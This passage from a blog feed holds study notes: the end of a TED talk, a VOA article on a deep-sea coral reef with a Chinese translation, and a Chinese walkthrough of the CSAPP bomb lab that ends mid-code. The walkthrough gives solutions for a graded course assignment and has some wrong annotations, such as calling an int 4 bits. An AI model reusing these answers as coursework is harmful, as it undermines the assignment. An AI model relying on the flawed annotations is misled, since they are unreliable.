title="Conclude"></a>Conclude</h2><p>Next time you speak, do those in advance. Now let me just put this in context to close. This is a serious point here. This is where we are now, right? We speak not very well to people who simply aren’t listening in an environment that’s all about noise and bad acoustics（听觉的）. I have talked about that on this stage in different phases. What would the world be like if we were speaking powerfully to people who were listening consciously in environments which were actually fit for purpose? Or to make that a bit larger, what would the world be like if we were creating sound consciously and consuming（倾听）sound consciously and designing all our environments consciously for sound? That would be a world that does sound beautiful, and one where understanding would be the norm, and that is an idea worth spreading.</p><p>Thank you. </p><p>(Applause)</p>]]></content>
      
      
      <categories>
          
          <category> TED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> TED </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Coral reef</title>
      <link href="/2024/02/01/VOA_1/"/>
      <url>/2024/02/01/VOA_1/</url>
      
        <content type="html"><![CDATA[<h1 id="Scientists-Map-Largest-Deep-Sea-Coral-Reef-off-US-Atlantic-Coast"><a href="#Scientists-Map-Largest-Deep-Sea-Coral-Reef-off-US-Atlantic-Coast" class="headerlink" title="Scientists Map Largest Deep-Sea Coral Reef off US Atlantic Coast"></a>Scientists Map Largest Deep-Sea Coral Reef off US Atlantic Coast</h1><blockquote><p><a href="https://www.51voa.com/VOA_Special_English/scientists-map-largest-deep-sea-coral-reef-off-us-atlantic-coast-92138.html">The MP3</a></p></blockquote><h2 id="The-article"><a href="#The-article" class="headerlink" title="The article"></a>The article</h2><h3 id="Map-the-coral-reef"><a href="#Map-the-coral-reef" class="headerlink" title="Map the coral reef"></a>Map the coral reef</h3><p>Scientists have mapped the largest <strong>coral reef</strong> off America’s Atlantic coast.</p><p>Researchers say the reef stretches about 500 kilometers from Florida to South Carolina. At some points, it is 109 kilometers wide. The researchers measured the reef using <strong>3D</strong> mapping technology.</p><p>“It’s eye-opening – it’s breathtaking in <strong>scale</strong>,” Stuart Sandin told The Associated Press. He is a marine biologist at the Scripps Institution of Oceanography<code>the Scientific study of Ocean</code>. Sandin was not included in the research.</p><p>Ocean scientists have known since the 1960s that some coral life was present off the Atlantic Coast. But the reef’s exact size had remained a mystery. New underwater mapping technology made it possible to construct images of the ocean floor in three dimensions.</p><h3 id="Deep-coral-reef"><a href="#Deep-coral-reef" class="headerlink" title="Deep coral reef"></a>Deep coral reef</h3><p>The largest yet known deep coral reef “has been right under our noses, waiting to be discovered,” said Derek Sowers. He is an oceanographer at the nonprofit group <a href="https://nautiluslive.org/">Ocean Exploration Trust</a>.</p><p>Sowers and other scientists recently released maps of the reef in the publication <em>Geomatics</em>(在这里是一种出版物).</p><p>The reef was found at ocean depths from 200 to 1,000 meters. Deep-sea life cannot use sunlight to carry out <strong>photosynthesis</strong>. Instead, reef corals at extreme depths must <strong>filter</strong> food particles<code>a small piece of something</code> out of the water for energy.</p><p>Deep coral reefs are known to contain animals such as sharks, swordfish<code>a large fish with a sword on its head</code>, sea stars, octopus<code>a creature with eight tentacles</code>, shrimp and many kinds of fish.</p><h3 id="Tropical-coral-reefs"><a href="#Tropical-coral-reefs" class="headerlink" title="Tropical coral reefs"></a>Tropical coral reefs</h3><p>Unlike deep coral reefs, tropical<code>coming from the hottest parts of the world</code> reefs are better known to scientists and sea explorers alike because they are easier to reach. The world’s largest tropical coral reef system, Australia’s Great Barrier Reef, stretches for 2,300 kilometers.</p><p>Sowers said it is possible larger deep-sea reefs will be discovered in the future since only about 25 percent of the world’s ocean floor has been mapped in 3D. Only 50 percent of U.S. offshore waters have been mapped. Maps of the ocean floor are created using high-technology sound equipment, called sonar, on ships.</p><p>Erik Cordes is a marine biologist at Temple University and a co-writer of a study on the mapping operation. He said deep reefs cover more of the ocean floor than tropical reefs. But both are currently facing similar risks, including climate change and damage from oil and gas exploration activities</p><p align="right">I'm Bryan Lynn</p><p align="right">Edit by Vite</p><h2 id="Some-information"><a href="#Some-information" class="headerlink" title="Some information"></a>Some information</h2><h3 id="Words-in-This-Story"><a href="#Words-in-This-Story" class="headerlink" title="Words in This Story"></a>Words in This Story</h3><p><strong>coral</strong> <em>– n.</em> a hard, usually pink or white substance produced by a type of small sea animal</p><p><strong>reef</strong> <em>– n.</em> a collection of rocks or sand that sits below the surface of the ocean</p><p><strong>3D (three dimensional)</strong> –adj. showing the height, width and length of something rather than just two dimensions</p><p><strong>scale</strong> <em>– n.</em> the size or level of something</p><p><strong>photosynthesis</strong> <em>– n.</em> the process by which a plant uses carbon dioxide from the air, water from the ground, and the energy from the light of the sun to produce its own food and oxygen</p><p><strong>filter</strong> <em>– v.</em> to pass a substance through a piece of equipment in order to remove solid pieces or other substances</p><h3 id="Chinese-Translation"><a href="#Chinese-Translation" class="headerlink" title="Chinese Translation"></a>Chinese Translation</h3><blockquote><p>科学家们绘制了美国大西洋沿岸最大的珊瑚礁的地图。</p><p>研究人员说，珊瑚礁从佛罗里达延伸到南卡罗来纳州约500公里。在某些地方，它是109公里宽。研究人员使用3D测绘技术测量了珊瑚礁。</p><p>“这是大开眼界-它的规模惊人，”斯图尔特桑丁告诉美联社。他是斯克里普斯海洋研究所的海洋生物学家。桑丁没有被包括在研究中。<br>自20世纪60年代以来，海洋科学家就已经知道大西洋沿岸存在一些珊瑚生命。但珊瑚礁的确切大小仍然是个谜。新的水下测绘技术使绘制海底三维图像成为可能。</p><p>迄今为止已知的最大的深海珊瑚礁“就在我们的鼻子底下，等待着被发现，”德里克·索沃斯说。他是非营利组织海洋探索信托基金会的海洋学家。</p><p>Sowers和其他科学家最近在Geomatics出版物中发布了珊瑚礁的地图。</p><p>珊瑚礁是在200至1,000米的海洋深处发现的。深海生物不能利用阳光进行光合作用。相反，在极端深处的珊瑚礁必须过滤水中的食物颗粒以获取能量。</p><p>众所周知，深海珊瑚礁中有鲨鱼、旗鱼、海星、章鱼、虾和许多种类的鱼。</p><p>与深海珊瑚礁不同，热带珊瑚礁更容易被科学家和海洋探险家所了解，因为它们更容易到达。世界上最大的热带珊瑚礁系统，澳大利亚的大堡礁，绵延2,300公里。</p><p>Sowers说，未来可能会发现更大的深海珊瑚礁，因为世界上只有大约25%的海底被绘制成3D地图。只有50%的美国近海沃茨被绘制成地图。海底地图是使用船上的声纳绘制的。</p><p>Erik Cordes是坦普尔大学的海洋生物学家，也是一项关于测绘工作的研究的合著者。他说，深海珊瑚礁比热带珊瑚礁覆盖更多的海底。但两者目前都面临着类似的风险，包括气候变化和石油和天然气勘探活动造成的损害.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> VOA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> VOA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP的lab2-bomblab</title>
      <link href="/2024/01/21/lab2/"/>
      <url>/2024/01/21/lab2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这个lab2真的做了很久,做的久,解析写的也久,还抽了部分打题的时间写的,这个lab是真的有意思</p></blockquote><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识:"></a>前置知识:</h2><ul><li><a href="https://zhzvite.github.io/EATPOOP/gdb_use/2024/01/17/">gdb使用指北</a></li><li>汇编语言的基本语法</li><li>链表</li><li>递归函数</li><li>耐得住诱惑</li></ul><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi0x0000000000400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;0x0000000000400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp0x0000000000400efb &lt;+27&gt;:    retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phase_1算是热身的一关，主要就是要发现到<strong>0x402400</strong>这个特殊的内存地址，毕竟默认下第一个参数是%rdi，那么第二个参数就是%rsi,有充分的理由怀疑，是在<strings_not_equal>这个函数里面对%rdi和%rsi里面的内存的函数值进行了比较,然后去这个函数里面看一看,可以猜出来时相等的话返回值是0,(test %eax,%eax),所以直接连string函数都不用看了,直接把0x402400里面的值找出来就是答案</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">p(char*)0x402400<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当热身了.</p><string_not_equal><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">40135c:0f b6 03             movzbl (%rbx),%eax    ; 将 %rbx 指向的字节加载到 %eax 中，并进行零扩展为32位40135f:84 c0                test   %al,%al       ; 测试 %al 中的值是否为零401361:74 25                je     401388 &lt;strings_not_equal+0x50&gt;  ; 如果为零（字符串结束），跳转到 401388401363:3a 45 00             cmp    0x0(%rbp),%al   ; 比较地址为 (%rbp) 的字节与 %al 中的值401366:74 0a                je     401372 &lt;strings_not_equal+0x3a&gt;  ; 如果相等，跳转到 401372401368:eb 25                jmp    40138f &lt;strings_not_equal+0x57&gt;  ; 比较不匹配，跳转到 40138f40136a:3a 45 00             cmp    0x0(%rbp),%al   ; 比较地址为 (%rbp) 的字节与 %al 中的值40136d:0f 1f 00             nopl   (%rax)         ; No operation，占位符，可忽略401370:75 24                jne    401396 &lt;strings_not_equal+0x5e&gt;  ; 如果不相等，跳转到 401396401372:48 83 c3 01          add    $0x1,%rbx       ; 将 %rbx 增加 1（移动到第一个字符串的下一个字符）401376:48 83 c5 01          add    $0x1,%rbp       ; 将 %rbp 增加 1（移动到第二个字符串的下一个字符）40137a:0f b6 03             movzbl (%rbx),%eax    ; 将 %rbx 指向的字节加载到 %eax 中，并进行零扩展为32位40137d:84 c0                test   %al,%al       ; 测试 %al 中的值是否为零40137f:75 e9                jne    40136a &lt;strings_not_equal+0x32&gt;  ; 如果不为零，继续比较401381:ba 00 00 00 00       mov    $0x0,%edx      ; 将 0 移动到 %edx（表示字符串相等）401386:eb 13                jmp    40139b &lt;strings_not_equal+0x63&gt;  ; 跳转到 40139b（函数结束）401388:ba 00 00 00 00       mov    $0x0,%edx      ; 将 0 移动到 %edx（表示字符串相等）40138d:eb 0c                jmp    40139b &lt;strings_not_equal+0x63&gt;  ; 跳转到 40139b（函数结束）40138f:ba 01 00 00 00       mov    $0x1,%edx      ; 将 1 移动到 %edx（表示字符串不相等）401394:eb 05                jmp    40139b &lt;strings_not_equal+0x63&gt;  ; 跳转到 40139b（函数结束）401396:ba 01 00 00 00       mov    $0x1,%edx      ; 将 1 移动到 %edx（表示字符串不相等）40139b:89 d0                mov    %edx,%eax      ; 将 %edx 的值移动到 %eax（结果）40139d:5b                   pop    %rbx           ; 从堆栈中弹出 %rbx40139e:5d                   pop    %rbp           ; 从堆栈中弹出 %rbp40139f:41 5c                pop    %r12           ; 从堆栈中弹出 %r124013a1:c3                   retq                  ; 从函数中返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400efc &lt;+0&gt;:     push   %rbp             ; 将 %rbp 寄存器的值推送到栈上0x0000000000400efd &lt;+1&gt;:     push   %rbx             ; 将 %rbx 寄存器的值推送到栈上0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp       ; 在栈上分配 0x28（40）字节的空间0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi         ; 将栈顶地址（%rsp）的值传递给 %rsi 寄存器0x0000000000400f05 &lt;+9&gt;:     callq  0x40145c &lt;read_six_numbers&gt;  ; 调用 read_six_numbers 函数0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)      ; 比较栈上第一个元素的值与 1 是否相等0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;  ; 如果相等，跳转到 0x400f30 处0x0000000000400f10 &lt;+20&gt;:    callq  0x40143a &lt;explode_bomb&gt;  ; 否则调用 explode_bomb 函数0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;  ; 跳转到 0x400f30 处0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax   ; 将 %rbx 寄存器指向的地址减 4的值 加载到 %eax,第二个参数,发现是加一倍0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax         ; 将 %eax 寄存器的值加倍0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)      ; 比较 %eax 和 %rbx 寄存器指向的地址处的值0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;  ; 如果相等，跳转到 0x400f25 处0x0000000000400f20 &lt;+36&gt;:    callq  0x40143a &lt;explode_bomb&gt;  ; 否则调用 explode_bomb 函数0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx        ; 将 %rbx 寄存器的值增加 40x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx        ; 比较 %rbp 和 %rbx 寄存器的值,比较是否是第六个数0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;  ; 如果不相等，跳转到 0x400f17 处0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;  ; 否则跳转到 0x400f3c 处,0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx  ; 计算栈上地址 %rsp + 4，并将结果存储到 %rbx 寄存器0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp ; 计算栈上地址 %rsp + 0x18（24），并将结果存储到 %rbp 寄存器0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;  ; 跳转到 0x400f17 处0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp       ; 在栈上释放 0x28（40）字节的空间0x0000000000400f40 &lt;+68&gt;:    pop    %rbx             ; 弹出栈顶的 %rbx 寄存器的值0x0000000000400f41 &lt;+69&gt;:    pop    %rbp             ; 弹出栈顶的 %rbp 寄存器的值0x0000000000400f42 &lt;+70&gt;:    retq                    ; 从函数中返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一个简单的倍增循环,需要知道stack的概念.</p><p>一开始能够简单的确定stack上的第一个元素与1是相等的</p><p>然后把第二个元素的地址加载到rbx上,因为里面存的是int,int是4个bit,所以每次加四,然后把前一个值加倍看他是否与当前值相等.</p><p>故六次循环后我们会发现每次循环能不断推断出第一个,第二个,直到第六个元素,为倍增关系</p><p>故答案: 1 2 4 8 16 32</p><p>代码混淆解释</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">rbx&#x3D;rsp+4  &#x2F;&#x2F;lea 0x4(%rsp),%rbxrbx&#x3D;*(rsp+4) &#x2F;&#x2F;mov 0x4(%rsp),%rbx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>人工打了跳转标记</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000400f43 &lt;phase_3&gt;:  400f43:48 83 ec 18          sub    $0x18,%rsp  400f47:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx  400f4c:48 8d 54 24 08       lea    0x8(%rsp),%rdx  400f51:be cf 25 40 00       mov    $0x4025cf,%esi  400f56:b8 00 00 00 00       mov    $0x0,%eax  400f5b:e8 90 fc ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;  400f60:83 f8 01             cmp    $0x1,%eax  400f63:7f 05                jg     .L1  400f65:e8 d0 04 00 00       callq  40143a &lt;explode_bomb&gt;  .L1  400f6a:83 7c 24 08 07       cmpl   $0x7,0x8(%rsp)  400f6f:77 3c                ja     .L2  400f71:8b 44 24 08          mov    0x8(%rsp),%eax  400f75:ff 24 c5 70 24 40 00 jmpq   *0x402470(,%rax,8)  400f7c:b8 cf 00 00 00       mov    $0xcf,%eax  400f81:eb 3b                jmp    .L3  400f83:b8 c3 02 00 00       mov    $0x2c3,%eax  400f88:eb 34                jmp    .L3  400f8a:b8 00 01 00 00       mov    $0x100,%eax  400f8f:eb 2d                jmp    .L3  400f91:b8 85 01 00 00       mov    $0x185,%eax  400f96:eb 26                jmp    .L3  400f98:b8 ce 00 00 00       mov    $0xce,%eax  400f9d:eb 1f                jmp    .L3  400f9f:b8 aa 02 00 00       mov    $0x2aa,%eax  400fa4:eb 18                jmp    .L3  400fa6:b8 47 01 00 00       mov    $0x147,%eax  400fab:eb 11                jmp    .L3  .L2   400fad:e8 88 04 00 00       callq  40143a &lt;explode_bomb&gt;  400fb2:b8 00 00 00 00       mov    $0x0,%eax  400fb7:eb 05                jmp    .L3  400fb9:b8 37 01 00 00       mov    $0x137,%eax  .L3  400fbe:3b 44 24 0c          cmp    0xc(%rsp),%eax  400fc2:74 05                je    .L4  400fc4:e8 71 04 00 00       callq  40143a &lt;explode_bomb&gt;  .L4  400fc9:48 83 c4 18          add    $0x18,%rsp  400fcd:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>gpt解读</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000400f43 &lt;phase_3&gt;:  400f43:48 83 ec 18          sub    $0x18,%rsp          ; 为局部变量分配空间  400f47:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx     ; 将局部变量地址加载到寄存器 rcx 中  400f4c:48 8d 54 24 08       lea    0x8(%rsp),%rdx     ; 将局部变量地址加载到寄存器 rdx 中  400f51:be cf 25 40 00       mov    $0x4025cf,%esi      ; 将常量地址加载到寄存器 esi 中  400f56:b8 00 00 00 00       mov    $0x0,%eax          ; 清零寄存器 eax  400f5b:e8 90 fc ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;  ; 调用 sscanf 函数，将输入解析为整数,  400f60:83 f8 01             cmp    $0x1,%eax          ; 比较返回值与1  400f63:7f 05                jg     .L1                ; 如果大于1，跳转到.L1  400f65:e8 d0 04 00 00       callq  40143a &lt;explode_bomb&gt;  ; 否则，调用 explode_bomb 函数  .L1  400f6a:83 7c 24 08 07       cmpl   $0x7,0x8(%rsp)    ; 比较第二个局部变量和7,0x8(%rsp)要小于7(无符号类型)  400f6f:77 3c                ja     .L2                ; 如果大于7，跳转到.L2  400f71:8b 44 24 08          mov    0x8(%rsp),%eax    ; 将第二个局部变量加载到寄存器 eax 中  400f75:ff 24 c5 70 24 40 00 jmpq   *0x402470(,%rax,8)  ; 通过跳转表间接调用不同的分支(%rax*8+*402470)  400f7c:b8 cf 00 00 00       mov    $0xcf,%eax        ; 第一种分支1:  400f81:eb 3b                jmp    .L3                ; 跳转到.L3  400f83:b8 c3 02 00 00       mov    $0x2c3,%eax       ; 第二种分支:2  400f88:eb 34                jmp    .L3                ; 跳转到.L3  400f8a:b8 00 01 00 00       mov    $0x100,%eax       ; 第三种分支.输入为3  400f8f:eb 2d                jmp    .L3                ; 跳转到.L3  400f91:b8 85 01 00 00       mov    $0x185,%eax       ; 第四种分支:4  400f96:eb 26                jmp    .L3                ; 跳转到.L3  400f98:b8 ce 00 00 00       mov    $0xce,%eax        ; 第五种分支  400f9d:eb 1f                jmp    .L3                ; 跳转到.L3  400f9f:b8 aa 02 00 00       mov    $0x2aa,%eax       ; 第六种分支  400fa4:eb 18                jmp    .L3                ; 跳转到.L3  400fa6:b8 47 01 00 00       mov    $0x147,%eax       ; 第七种分支  400fab:eb 11                jmp    .L3                ; 跳转到.L3  .L2   400fad:e8 88 04 00 00       callq  40143a &lt;explode_bomb&gt;  ; 如果第二个局部变量大于7，调用 explode_bomb 函数  400fb2:b8 00 00 00 00       mov    $0x0,%eax          ; 将返回值清零  400fb7:eb 05                jmp    .L3                ; 跳转到.L3  400fb9:b8 37 01 00 00       mov    $0x137,%eax       ; 第八种分支  .L3  400fbe:3b 44 24 0c          cmp    0xc(%rsp),%eax    ; 比较第三个局部变量和返回值   400fc2:74 05                je    .L4                ; 如果相等，跳转到.L4  400fc4:e8 71 04 00 00       callq  40143a &lt;explode_bomb&gt;  ; 否则，调用 explode_bomb 函数  .L4  400fc9:48 83 c4 18          add    $0x18,%rsp         ; 函数结束，恢复栈空间  400fcd:c3                   retq                      ; 返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>_isoc99_sscanf</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">其转换了含有几个整数的字符串则返回值是几<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>0x0(%rsp)</code> 是栈顶位置，通常是函数的返回地址。</li><li><code>0x4(%rsp)</code> 是栈顶位置向下偏移4字节的位置，可能是一个局部变量或参数。</li></ul><p>在这么多条分支里面找到一条能成立的就可以了</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmpq   *0x402470(,%rax,8) <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个函数是重点,这是跳转表间接实现switch操作,先确定输入的第一个变量在[0,7]之间,首先用gdb指令确定*0x402470的值,假定其会跳转到第一个分支,即令第一个变量等于0,刚好能跳转到第一个分支,那想要炸弹不爆炸只能%eax&#x3D;207,所以其中一种答案就算出来了</p><p>答案 0 207</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">  ;设第一个数字为a,第二个数字为b  0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp  0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx  0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx  0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi  0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax  0x0000000000401024 &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;;读入  0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax;个数为2  0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;  0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp);比较a和0xe,a&lt;&#x3D;0xe&#x3D;14  0x0000000000401033 &lt;+39&gt;:    jbe    .L1  0x0000000000401035 &lt;+41&gt;:    callq  0x40143a &lt;explode_bomb&gt;.L1 0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx;往里面塞两个值edx,esi更新;  0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi  0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi;edi&#x3D;a  0x0000000000401048 &lt;+60&gt;:    callq  0x400fce &lt;func4&gt;;调用func4  0x000000000040104d &lt;+65&gt;:    test   %eax,%eax;还要看eax是否为0,即返回值是否为0,结合后文,返回值要0  0x000000000040104f &lt;+67&gt;:    jne    .L2  0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp);故b&#x3D;0  0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;  .L2  0x0000000000401058 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;  0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp  0x0000000000401061 &lt;+85&gt;:    retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在我们要确定数字a,b,已知b&#x3D;0,故要确定a的值</p><p>补充资料</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">rdi：第一个参数rsi：第二个参数rdx：第三个参数rcx：第四个参数r8：第五个参数r9：第六个参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><func4>#目标是让rax即返回值是0</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">;rdi&#x3D;a;edx&#x3D;e;esi&#x3D;0  .L3  0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp  # retval&#x3D;rdx   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax     #retval-&#x3D;rsi   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx#右移31位&#x3D;&#x3D;&gt;取符号位   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax   ---   0x0000000000400fdd &lt;+15&gt;:    sar    %eax ;eax&#x2F;&#x3D;2;ret&#x3D;ret&gt;&gt;1   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx;ecx&#x3D;rax+rsi      0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx;&lt;&#x3D;   #if(ecx&#x3D;&#x3D;edi)return 0   #if(ecx&lt;edi)func()   0x0000000000400fe4 &lt;+22&gt;:    jle    .L1   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx   0x0000000000400fe9 &lt;+27&gt;:    callq  0x400fce &lt;func4&gt;      0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax#倍增   0x0000000000400ff0 &lt;+34&gt;:    jmp    .L2  .L1  0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax;     0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx   0x0000000000400ff9 &lt;+43&gt;:    jge    .L2   #esi&#x3D;rcx+1   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi   0x0000000000400ffe &lt;+48&gt;:    .L3;调回到开头,即为一次递归调用,观察其改变什么值就可以了   ;即返回值ret后要再倍增+1   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax;2*%rax+1   .L2   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp   0x000000000040100b &lt;+61&gt;:    retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>观察如何让rax&#x3D;0;</p><p>把它按行翻译为c++代码,然后跑一遍就好了</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//int rdi=x,edx=a1,esi=a2,rcx=tmp</span><span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span><span class="token keyword">int</span> a2<span class="token punctuation">,</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token comment">//ret=a1</span><span class="token comment">//ret-=a2</span><span class="token comment">//int tmp=ret</span><span class="token comment">//tmp>>31</span>tmp<span class="token operator">=</span><span class="token punctuation">(</span>a1<span class="token operator">-</span>a2<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">31</span><span class="token punctuation">;</span>ret<span class="token operator">=</span><span class="token punctuation">(</span>a1<span class="token operator">-</span>a2<span class="token operator">+</span>tmp<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>tmp<span class="token operator">=</span>ret<span class="token operator">+</span>a2<span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token operator">==</span>x<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token operator">&lt;</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ret<span class="token operator">=</span><span class="token function">func</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>tmp<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">2</span><span class="token operator">*</span>ret<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token operator">></span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> ret<span class="token operator">=</span><span class="token function">func</span><span class="token 